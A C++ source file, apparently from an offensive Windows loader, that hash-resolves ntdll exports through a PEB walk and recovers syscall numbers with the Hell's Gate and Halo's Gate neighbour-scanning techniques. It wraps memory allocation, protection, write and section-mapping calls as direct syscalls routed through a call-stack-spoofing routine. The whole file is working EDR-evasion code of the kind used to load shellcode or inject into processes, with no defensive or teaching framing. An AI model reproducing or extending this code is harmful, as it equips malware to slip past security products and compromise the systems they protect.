#include "syscalls.h"
#include "peb_walk.h"
#include "hash.h"
#include "stackspoof.h"
#include <cstdio>

SyscallTable g_syscalls = {};

static bool resolve_ssn_hellsgate(void* func_addr, SyscallEntry* entry) {
    if (!func_addr) return false;

    uint8_t* bytes = reinterpret_cast<uint8_t*>(func_addr);
    entry->func_addr = func_addr;

    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8) {
        entry->ssn = *reinterpret_cast<uint32_t*>(bytes + 4);

        for (int i = 0; i < 64; i++) {
            if (bytes[i] == 0x0F && bytes[i + 1] == 0x05 && bytes[i + 2] == 0xC3) {
                entry->syscall_addr = bytes + i;
                entry->resolved = true;
                return true;
            }
        }
    }

    for (int distance = 1; distance <= 32; distance++) {
        for (int sign = -1; sign <= 1; sign += 2) {
            uint8_t* neighbor = bytes + (sign * distance * 0x20);

            if (neighbor[0] == 0x4C && neighbor[1] == 0x8B && neighbor[2] == 0xD1 && neighbor[3] == 0xB8) {
                uint32_t neighbor_ssn = *reinterpret_cast<uint32_t*>(neighbor + 4);
                entry->ssn = neighbor_ssn + static_cast<uint32_t>(sign * distance * -1);

                for (int i = 0; i < 64; i++) {
                    if (neighbor[i] == 0x0F && neighbor[i + 1] == 0x05 && neighbor[i + 2] == 0xC3) {
                        entry->syscall_addr = neighbor + i;
                        entry->resolved = true;
                        return true;
                    }
                }
            }
        }
    }

    return false;
}

bool resolve_syscalls() {
    struct {
        uint32_t func_hash;
        SyscallEntry* entry;
    } targets[] = {
        { HASH_NtAllocateVirtualMemory,   &g_syscalls.NtAllocateVirtualMemory },
        { HASH_NtProtectVirtualMemory,    &g_syscalls.NtProtectVirtualMemory },
        { HASH_NtWriteVirtualMemory,      &g_syscalls.NtWriteVirtualMemory },
        { HASH_NtFreeVirtualMemory,       &g_syscalls.NtFreeVirtualMemory },
        { HASH_NtOpenSection,             &g_syscalls.NtOpenSection },
        { HASH_NtMapViewOfSection,        &g_syscalls.NtMapViewOfSection },
        { HASH_NtUnmapViewOfSection,      &g_syscalls.NtUnmapViewOfSection },
        { HASH_NtClose,                   &g_syscalls.NtClose },
        { HASH_NtQueryInformationProcess, &g_syscalls.NtQueryInformationProcess },
        { HASH_NtOpenFile,                &g_syscalls.NtOpenFile },
        { HASH_NtCreateSection,           &g_syscalls.NtCreateSection },
        { HASH_NtWaitForSingleObject,     &g_syscalls.NtWaitForSingleObject },
    };

    for (auto& t : targets) {
        void* addr = resolve_function(HASH_NTDLL, t.func_hash);
        if (!addr) return false;
        if (!resolve_ssn_hellsgate(addr, t.entry)) return false;
    }

    return true;
}

NTSTATUS sc_NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    auto& e = g_syscalls.NtAllocateVirtualMemory;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(ProcessHandle),
        reinterpret_cast<void*>(BaseAddress),
        reinterpret_cast<void*>(ZeroBits),
        reinterpret_cast<void*>(RegionSize),
        reinterpret_cast<void*>(static_cast<uintptr_t>(AllocationType)),
        reinterpret_cast<void*>(static_cast<uintptr_t>(Protect)),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    auto& e = g_syscalls.NtProtectVirtualMemory;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(ProcessHandle),
        reinterpret_cast<void*>(BaseAddress),
        reinterpret_cast<void*>(RegionSize),
        reinterpret_cast<void*>(static_cast<uintptr_t>(NewProtect)),
        reinterpret_cast<void*>(OldProtect),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG FreeType) {
    auto& e = g_syscalls.NtFreeVirtualMemory;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(ProcessHandle),
        reinterpret_cast<void*>(BaseAddress),
        reinterpret_cast<void*>(RegionSize),
        reinterpret_cast<void*>(static_cast<uintptr_t>(FreeType)),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes) {
    auto& e = g_syscalls.NtOpenSection;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(SectionHandle),
        reinterpret_cast<void*>(static_cast<uintptr_t>(DesiredAccess)),
        reinterpret_cast<void*>(ObjectAttributes),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, ULONG InheritDisposition,
    ULONG AllocationType, ULONG Win32Protect) {
    auto& e = g_syscalls.NtMapViewOfSection;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(SectionHandle),
        reinterpret_cast<void*>(ProcessHandle),
        reinterpret_cast<void*>(BaseAddress),
        reinterpret_cast<void*>(ZeroBits),
        reinterpret_cast<void*>(CommitSize),
        reinterpret_cast<void*>(SectionOffset),
        reinterpret_cast<void*>(ViewSize),
        reinterpret_cast<void*>(static_cast<uintptr_t>(InheritDisposition)),
        reinterpret_cast<void*>(static_cast<uintptr_t>(AllocationType)),
        reinterpret_cast<void*>(static_cast<uintptr_t>(Win32Protect)),
        nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    auto& e = g_syscalls.NtUnmapViewOfSection;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(ProcessHandle),
        reinterpret_cast<void*>(BaseAddress),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtClose(HANDLE Handle) {
    auto& e = g_syscalls.NtClose;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(Handle),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
    ULONG ShareAccess, ULONG OpenOptions) {
    auto& e = g_syscalls.NtOpenFile;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(FileHandle),
        reinterpret_cast<void*>(static_cast<uintptr_t>(DesiredAccess)),
        reinterpret_cast<void*>(ObjectAttributes),
        reinterpret_cast<void*>(IoStatusBlock),
        reinterpret_cast<void*>(static_cast<uintptr_t>(ShareAccess)),
        reinterpret_cast<void*>(static_cast<uintptr_t>(OpenOptions)),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    auto& e = g_syscalls.NtCreateSection;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(SectionHandle),
        reinterpret_cast<void*>(static_cast<uintptr_t>(DesiredAccess)),
        reinterpret_cast<void*>(ObjectAttributes),
        reinterpret_cast<void*>(MaximumSize),
        reinterpret_cast<void*>(static_cast<uintptr_t>(SectionPageProtection)),
        reinterpret_cast<void*>(static_cast<uintptr_t>(AllocationAttributes)),
        reinterpret_cast<void*>(FileHandle),
        nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}

NTSTATUS sc_NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable,
    PLARGE_INTEGER Timeout) {
    auto& e = g_syscalls.NtWaitForSingleObject;
    return SpoofCallSyscall(
        reinterpret_cast<void*>(Handle),
        reinterpret_cast<void*>(static_cast<uintptr_t>(Alertable)),
        reinterpret_cast<void*>(Timeout),
        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, nullptr,
        e.ssn, e.syscall_addr
    );
}
